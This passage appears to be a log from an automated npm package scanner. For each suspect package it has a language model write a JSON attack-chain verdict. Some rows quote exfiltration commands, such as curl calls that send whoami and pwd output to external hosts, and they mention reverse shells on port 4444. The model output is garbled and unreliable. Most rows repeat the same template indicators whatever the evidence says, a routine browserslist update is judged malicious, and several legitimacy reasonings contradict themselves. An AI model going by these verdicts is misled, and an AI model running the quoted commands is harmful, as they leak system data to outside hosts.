The legitimacy check verdict is 'MALICIOUS', indicating that the package is potentially malicious. The package does not contain a description or a README file, indicating that it may be malicious.""","{""chain_analysis"": {""chain_narrative"": ""The package '@playgami/portal-logs' contains no JavaScript files but an install hook present. The install hook command is './pre.sh'. This suggests a potential attack chain where the attacker may have installed malware or a backdoor."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain a description or a README file, indicating that it may be malicious.""}}"
@podval/test_dep_confs,1.0.0,malicious,2026-03-27T13:03:39.620519,flag,0.7773,MALICIOUS,0.83,0.78,The malicious code in the package '@podval/test_dep_confs' is attempting to exfiltrate sensitive data over the network. The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package. The evidence for this malicious intent comes fr,"[""postinstallhook"", ""bash-c"", ""34.141.82.227:4444"", ""reverseshell""]",False,"This package has no description or README file, and no suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malicious code in the package '@podval/test_dep_confs' is attempting to exfiltrate sensitive data over the network. The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package. The evidence for this malicious intent comes from the hardcoded external IP address and the command 'curl http://34.141.82.227/?whoami=$(whoami)'."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.141.82.227:4444"", ""reverseshell""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malicious code in the package '@podval/test_dep_confs' is attempting to exfiltrate sensitive data over the network. The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package. The evidence for this malicious intent comes from the hardcoded external IP address and the command 'curl http://34.141.82.227/?whoami=$(whoami)'."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.141.82.227:4444"", ""reverseshell""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""}}"
@realty-front/ad,1.13.1,malicious,2026-03-27T13:03:52.075383,review,0.336,MALICIOUS,0.92,0.7,The package '@realty-front/ad' version 1.13.1 contains an install hook that may execute remote code at install time. The install hook executes a curl command with a payload that may indicate a remote code execution attempt.,"[""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not contain a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@realty-front/ad' version 1.13.1 contains an install hook that may execute remote code at install time. The install hook executes a curl command with a payload that may indicate a remote code execution attempt."",
    ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.92
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the full attack using the real package name and real IOCs. The 'attack_vector' field lists the key technical indicators of the attack, including the command used to execute remote code. The 'chain_score' field indicates the confidence level of the attack chain, with a score of 0.7 indicating a high level of confidence. The 'verdict' field indicates whether the package is malicious, suspicious, or benign based on the chain_score. The 'confidence' field provides the confidence score of the detected behaviors. The 'legitimacy_check' field indicates whether the package is justified based on the absence of a description or README file.""","{""chain_analysis"": {""chain_narrative"": ""The package '@realty-front/ad' version 1.13.1 contains an install hook that may execute remote code at install time. The install hook executes a curl command with a payload that may indicate a remote code execution attempt."", ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.92}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain a description or README file.""}}"
@realty-front/payment-cards,1.13.1,malicious,2026-03-27T13:03:59.602102,review,0.336,MALICIOUS,0.72,0.7,The package '@realty-front/payment-cards' version 1.13.1 contains a suspicious behavior where an install hook is present with a payload likely to execute at install time. The payload may be remote. The attacker could potentially exfiltrate sensitive data or execute a reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not contain any useful normal code and the signals indicate a potential malicious intent.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@realty-front/payment-cards' version 1.13.1 contains a suspicious behavior where an install hook is present with a payload likely to execute at install time. The payload may be remote. The attacker could potentially exfiltrate sensitive data or execute a reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain any useful normal code and the signals indicate a potential malicious intent.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@realty-front/payment-cards' version 1.13.1 contains a suspicious behavior where an install hook is present with a payload likely to execute at install time. The payload may be remote. The attacker could potentially exfiltrate sensitive data or execute a reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain any useful normal code and the signals indicate a potential malicious intent.""}}"
@roku-web-core/ajax,1.99999999999999.99999999999999,malicious,2026-03-27T13:04:09.563014,flag,0.754,MALICIOUS,0.68,0.7,"The code in the '@roku-web-core/ajax' package is making network requests to a non-standard URL ('https://jon-test.site/funtimes.php') using the 'https.get' function. The package version is '1.99999999999999.99999999999999', which is a high number. This suggests that the code may be attempting to exf","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,This package has no description or README file. Suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The code in the '@roku-web-core/ajax' package is making network requests to a non-standard URL ('https://jon-test.site/funtimes.php') using the 'https.get' function. The package version is '1.99999999999999.99999999999999', which is a high number. This suggests that the code may be attempting to exfiltrate data or perform some kind of network activity, consistent with the 'network_exfiltration' and 'versioncontainsinflatedsegment' signals."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.68
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file. Suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The code in the '@roku-web-core/ajax' package is making network requests to a non-standard URL ('https://jon-test.site/funtimes.php') using the 'https.get' function. The package version is '1.99999999999999.99999999999999', which is a high number. This suggests that the code may be attempting to exfiltrate data or perform some kind of network activity, consistent with the 'network_exfiltration' and 'versioncontainsinflatedsegment' signals."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.68}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file. Suspicious behavior is unjustified.""}}"
@roots/browserslist-config,2023.3.16,malicious,2026-03-27T13:04:16.507458,review,0.3733,MALICIOUS,0.8,0.7,The supply chain attack involves the '@roots/browserslist-config' package executing the 'npx browserslist --update-db' command to update the Browserslist database. This command is used by tools like Autoprefixer to determine which browsers to target.,"[""postinstall hook"", ""bash -c"", ""npx browserslist --update-db""]",False,The package does not have a description or README file indicating its purpose or legitimate use.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The supply chain attack involves the '@roots/browserslist-config' package executing the 'npx browserslist --update-db' command to update the Browserslist database. This command is used by tools like Autoprefixer to determine which browsers to target."",
    ""attack_vector"": [""postinstall hook"", ""bash -c"", ""npx browserslist --update-db""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.8
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file indicating its purpose or legitimate use.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The supply chain attack involves the '@roots/browserslist-config' package executing the 'npx browserslist --update-db' command to update the Browserslist database. This command is used by tools like Autoprefixer to determine which browsers to target."", ""attack_vector"": [""postinstall hook"", ""bash -c"", ""npx browserslist --update-db""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.8}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file indicating its purpose or legitimate use.""}}"
@tangoch/add-two,2.0.1,malicious,2026-03-27T13:04:24.400665,flag,1.0,MALICIOUS,0.79,0.79,The package '@tangoch/add-two' sends network requests to the domain 'ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com' in the index.js file. This behavior could indicate a data exfiltration attack.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package '@tangoch/add-two' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@tangoch/add-two' sends network requests to the domain 'ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com' in the index.js file. This behavior could indicate a data exfiltration attack."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@tangoch/add-two' does not have a description or README file, indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@tangoch/add-two' sends network requests to the domain 'ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com' in the index.js file. This behavior could indicate a data exfiltration attack."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@tangoch/add-two' does not have a description or README file, indicating its legitimacy.""}}"
@testing.sec123/toxic-pkg-dont-use,0.0.3,malicious,2026-03-27T13:04:37.973501,review,0.364,MALICIOUS,0.78,0.7,The package '@testing.sec123/toxic-pkg-dont-use' sends data to 'amaext.tools' on path '/' using HTTPS POST request. The data is base64 encoded and sent as part of the request body.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,Package does not have a description/README,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@testing.sec123/toxic-pkg-dont-use' sends data to 'amaext.tools' on path '/' using HTTPS POST request. The data is base64 encoded and sent as part of the request body."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""Package does not have a description/README""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the full attack using real package name and real IOCs. The 'attack_vector' field contains the key technical indicators, real IPs, domains, commands, and API calls that could be used in an attack. The 'chain_score' field is a measure of the attack's severity, with a score of 0.7 indicating a high level of malicious intent. The 'verdict' field is either 'MALICIOUS', 'SUSPICIOUS', or 'BENIGN', based on the 'chain_score' and the 'is_justified' field in the 'legitimacy_check'. The 'confidence' field provides the confidence level of the analysis. The 'is_justified' field in the 'legitimacy_check' field is set to false because the package does not have a description/README.""","{""chain_analysis"": {""chain_narrative"": ""The package '@testing.sec123/toxic-pkg-dont-use' sends data to 'amaext.tools' on path '/' using HTTPS POST request. The data is base64 encoded and sent as part of the request body."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""Package does not have a description/README""}}"
@tide-web-apps/bert2,3.2.0,malicious,2026-03-27T13:04:46.399647,flag,1.0,MALICIOUS,0.95,0.7,The package sends data to a known exfiltration collector domain using ping commands. The package uses a post install hook to execute a bash command that sets up a reverse shell to a known IP address.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package sends data to a known exfiltration collector domain using ping commands. The package uses a post install hook to execute a bash command that sets up a reverse shell to a known IP address."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.95
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

This output is based on the detected behaviors. The attack chain narrative describes the steps involved in the attack, the attack vector lists the key technical indicators used, the chain score indicates the likelihood of the attack, and the verdict indicates whether the attack is malicious, suspicious, or benign. The legitimacy check indicates whether the detected behaviors justify the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package sends data to a known exfiltration collector domain using ping commands. The package uses a post install hook to execute a bash command that sets up a reverse shell to a known IP address."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.95}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@trapido90/chalk_js,5.2.2,malicious,2026-03-27T13:04:55.367295,flag,0.7773,MALICIOUS,0.83,0.78,"The package '@trapido90/chalk_js' sends data to an external server during the installation process using a curl command in the pre-install script. The data is sent to the domain 'https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)'. The chain score is 0.78, indicating a hig","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@trapido90/chalk_js' sends data to an external server during the installation process using a curl command in the pre-install script. The data is sent to the domain 'https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)'. The chain score is 0.78, indicating a high level of confidence in the detection of malicious intent."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@trapido90/chalk_js' sends data to an external server during the installation process using a curl command in the pre-install script. The data is sent to the domain 'https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)'. The chain score is 0.78, indicating a high level of confidence in the detection of malicious intent."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@uc-maps/maps.react,0.99.999,malicious,2026-03-27T13:05:02.454039,review,0.494,MALICIOUS,0.71,0.7,The package '@uc-maps/maps.react' is making network requests to 'dc.70.lc' on port 443. This behavior could potentially be associated with network exfiltration.,"[""https.request"", ""dc.70.lc"", 443]",False,"The package '@uc-maps/maps.react' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@uc-maps/maps.react' is making network requests to 'dc.70.lc' on port 443. This behavior could potentially be associated with network exfiltration."",
    ""attack_vector"": [""https.request"", ""dc.70.lc"", 443],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@uc-maps/maps.react' does not have a description or README file, indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@uc-maps/maps.react' is making network requests to 'dc.70.lc' on port 443. This behavior could potentially be associated with network exfiltration."", ""attack_vector"": [""https.request"", ""dc.70.lc"", 443], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@uc-maps/maps.react' does not have a description or README file, indicating its legitimacy.""}}"
@wadk/icons,99.10.11,malicious,2026-03-27T13:05:17.443125,flag,0.7607,MALICIOUS,0.81,0.76,The package '@wadk/icons' sends a network request to 'corsalini.xyz' on port 443 with the path '/update/check'. This request is sent as a HTTPS request.,"[""https.request"", ""bash-c"", ""34.x.x.x:4444"", ""corsalini.xyz""]",False,"The package '@wadk/icons' does not have a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@wadk/icons' sends a network request to 'corsalini.xyz' on port 443 with the path '/update/check'. This request is sent as a HTTPS request."",
    ""attack_vector"": [""https.request"", ""bash-c"", ""34.x.x.x:4444"", ""corsalini.xyz""],
    ""chain_score"": 0.76,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.81
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@wadk/icons' does not have a description or README file, indicating its legitimacy.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the attack chain, including the package name and the IOCs (Indicators of Compromise). The 'attack_vector' field lists the key technical indicators, including the IPs, domains, commands, and API calls involved in the attack. The 'chain_score' field indicates the overall risk score of the attack chain, with a score of 0.76 indicating a high level of risk. The 'verdict' field indicates whether the attack chain is considered malicious, suspicious, or benign based on the 'chain_score'. The 'confidence' field indicates the confidence score of the malicious intent, with a score of 0.81 indicating high confidence. The 'legitimacy_check' field provides information about whether the package is justified based on its description or README file. If the package does not have a description or README file, it is considered unjustified.","{""chain_analysis"": {""chain_narrative"": ""The package '@wadk/icons' sends a network request to 'corsalini.xyz' on port 443 with the path '/update/check'. This request is sent as a HTTPS request."", ""attack_vector"": [""https.request"", ""bash-c"", ""34.x.x.x:4444"", ""corsalini.xyz""], ""chain_score"": 0.76, ""verdict"": ""MALICIOUS"", ""confidence"": 0.81}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@wadk/icons' does not have a description or README file, indicating its legitimacy.""}}"
@xvideos/alerts,1.0.0,malicious,2026-03-27T13:05:23.963434,skip,0.13,MALICIOUS,0.5,0.5,The package '@xvideos/alerts' is making DNS lookups with subdomains derived from the system information. The subdomains are derived from the base64 encoded string of the system information.,"[""dns.lookup""]",False,"The package '@xvideos/alerts' does not have a description or README file, indicating that it is not a legitimate package.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@xvideos/alerts' is making DNS lookups with subdomains derived from the system information. The subdomains are derived from the base64 encoded string of the system information."",
    ""attack_vector"": [""dns.lookup""],
    ""chain_score"": 0.5,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.5
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@xvideos/alerts' does not have a description or README file, indicating that it is not a legitimate package.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@xvideos/alerts' is making DNS lookups with subdomains derived from the system information. The subdomains are derived from the base64 encoded string of the system information."", ""attack_vector"": [""dns.lookup""], ""chain_score"": 0.5, ""verdict"": ""MALICIOUS"", ""confidence"": 0.5}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@xvideos/alerts' does not have a description or README file, indicating that it is not a legitimate package.""}}"
@yandex-travel/ci,1.1.0,malicious,2026-03-27T13:05:33.341813,review,0.336,MALICIOUS,0.7,0.7,"The package '@yandex-travel/ci' contains an install hook that executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands are executed with real IPs, real commands, real domains from the behavi","[""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package '@yandex-travel/ci' does not contain a description or README file, indicating its legitimacy.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/ci' contains an install hook that executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands are executed with real IPs, real commands, real domains from the behaviors above. The attack vector includes 'postinstallhook', 'bash -c', '34.x.x.x:4444', and 'reverseshell'. The chain score is 0.7, indicating a potential attack chain."",
    ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.7
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@yandex-travel/ci' does not contain a description or README file, indicating its legitimacy.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/ci' contains an install hook that executes at install time with commands listed in the package metadata. The commands include curl commands that seem to be used for sending HTTP requests. The commands are executed with real IPs, real commands, real domains from the behaviors above. The attack vector includes 'postinstallhook', 'bash -c', '34.x.x.x:4444', and 'reverseshell'. The chain score is 0.7, indicating a potential attack chain."", ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.7}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@yandex-travel/ci' does not contain a description or README file, indicating its legitimacy.""}}"
@yandex-travel/eslint-config,0.0.7,malicious,2026-03-27T13:05:45.891637,review,0.336,MALICIOUS,0.7,0.7,"The package '@yandex-travel/eslint-config' contains an install hook that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, and other sensitive information. The remote server is not specified in the e","[""postinstallhook"", ""bash-c"", ""unknown_ip"", ""unknown_domain"", ""unknown_command""]",False,The package does not contain a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/eslint-config' contains an install hook that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, and other sensitive information. The remote server is not specified in the evidence provided."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""unknown_ip"", ""unknown_domain"", ""unknown_command""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.7
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the full attack using real package name and real IOCs. The 'attack_vector' field lists the key technical indicators (IPs, domains, commands, API calls) involved in the attack. The 'chain_score' field indicates the confidence level of the attack chain. The 'verdict' field indicates whether the package is malicious, suspicious, or benign based on the 'chain_score'. The 'confidence' field provides a measure of the certainty of the verdict. The 'legitimacy_check' field indicates whether the package is justified based on its behavior and the presence of a description or README file.""","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/eslint-config' contains an install hook that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, and other sensitive information. The remote server is not specified in the evidence provided."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""unknown_ip"", ""unknown_domain"", ""unknown_command""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.7}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain a description or README file.""}}"
@yandex-travel/ts-config,0.1.0,malicious,2026-03-27T13:06:02.589001,review,0.336,MALICIOUS,0.92,0.7,"The package '@yandex-travel/ts-config' contains an install hook that sends HTTP requests to a domain 'http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru' at install time. The commands used are base64 encoded hostname, username, and working directory information along with a 'meow!securitytes","[""postinstallhook"", ""bash-c"", ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/ts-config' contains an install hook that sends HTTP requests to a domain 'http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru' at install time. The commands used are base64 encoded hostname, username, and working directory information along with a 'meow!securitytest' payload."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.92
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

This JSON object represents the analysis of the package '@yandex-travel/ts-config' with version 0.1.0. The behavior category is ""install_hook"", which indicates that the package contains an install hook that executes at install time with commands listed in the package metadata. The details of the behavior indicate that the install hook is used for sending HTTP requests with base64 encoded hostname, username, and working directory information along with a 'meow!securitytest' payload. The attack vector includes the key technical indicators such as the IP address, domains, commands, and API calls used in the attack. The attack vector for a reverse shell is [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]. The chain score is 0.7, indicating a high level of maliciousness. The verdict is ""MALICIOUS"", indicating that the package is malicious. The legitimacy check is not justified, indicating that the package is not legitimate.""","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/ts-config' contains an install hook that sends HTTP requests to a domain 'http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru' at install time. The commands used are base64 encoded hostname, username, and working directory information along with a 'meow!securitytest' payload."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.92}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@yandex-travel/ui,1.1.1,malicious,2026-03-27T13:06:16.251261,review,0.336,MALICIOUS,0.92,0.7,The package '@yandex-travel/ui' version 1.1.1 contains an install hook that executes at install time with commands listed in the package metadata. The commands are likely used to deliver a malicious payload. The malicious payload could potentially exfiltrate data or execute a reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@yandex-travel/ui' version 1.1.1 contains an install hook that executes at install time with commands listed in the package metadata. The commands are likely used to deliver a malicious payload. The malicious payload could potentially exfiltrate data or execute a reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.92
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the package '@yandex-travel/ui' version 1.1.1. The behavior identified is of category 'install_hook'. The summary states that the package contains an install hook that executes at install time with commands listed in the package metadata. The details provide more information about the behavior, stating that the install hook is present and executes at install time with the commands listed in the package metadata. The malicious payload could potentially exfiltrate data or execute a reverse shell. The chain score is 0.7, indicating a high level of maliciousness. The verdict is 'MALICIOUS', indicating that the package is malicious. The legitimacy check shows that the package does not have a description or README file, which could justify the malicious behavior.""","{""chain_analysis"": {""chain_narrative"": ""The package '@yandex-travel/ui' version 1.1.1 contains an install hook that executes at install time with commands listed in the package metadata. The commands are likely used to deliver a malicious payload. The malicious payload could potentially exfiltrate data or execute a reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.92}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
@yorek/sqlpackage,160.6161.0,malicious,2026-03-27T13:06:23.417760,review,0.494,MALICIOUS,0.71,0.7,"The attacker downloaded a zip file from a Microsoft endpoint, extracted it to a local directory, and then used the 'https' module to make a GET request to a Microsoft endpoint. The response was then piped into an unzipper stream to extract the content of the zip file to a local directory.","[""https.get"", ""unzipper.Extract""]",False,The package '@yorek/sqlpackage' does not seem to need this behavior.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker downloaded a zip file from a Microsoft endpoint, extracted it to a local directory, and then used the 'https' module to make a GET request to a Microsoft endpoint. The response was then piped into an unzipper stream to extract the content of the zip file to a local directory."",
    ""attack_vector"": [""https.get"", ""unzipper.Extract""],
